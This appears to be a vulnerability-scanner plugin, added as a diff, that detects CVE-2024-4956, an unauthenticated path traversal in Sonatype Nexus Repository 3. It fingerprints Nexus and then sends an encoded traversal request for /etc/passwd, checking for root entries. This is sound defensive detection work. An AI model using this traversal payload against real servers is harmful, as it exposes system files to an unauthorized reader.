@@ -1,0 +1,79 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "Nexus_CVE_2024_4956"
+  author: "W0ngL1"
+  version: "1.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "GOOGLE"
+    value: "CVE-2024-4956"
+  }
+  severity: CRITICAL
+  title: "Nexus Repository 3 Arbitrary File Read (CVE-2024-4956)"
+  description: "A Path Traversal in Sonatype Nexus Repository 3 allows an unauthenticated attacker to read system files."
+  recommendation: "Update the version to 3.68.1 or later."
+  related_id: {
+    publisher: "CVE"
+    value: "CVE-2024-4956"
+  }
+}
+
+config: {}
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "fingerprinting_for_nexus"
+  http_request: {
+    method: GET
+    uri: "/"
+    headers: []
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { body: {} contains: "<title>Sonatype Nexus Repository</title>" }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "trigger_arbitrary_file_read"
+  http_request: {
+    method: GET
+    uri: "/%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f../etc/passwd"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { body: {} contains: "root:"},
+          { body: {} contains: ":0:0:"}
+        ]
+      }
+    }
+  }
+}
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  actions: [
+    "fingerprinting_for_nexus",
+    "trigger_arbitrary_file_read"
+  ]
+}
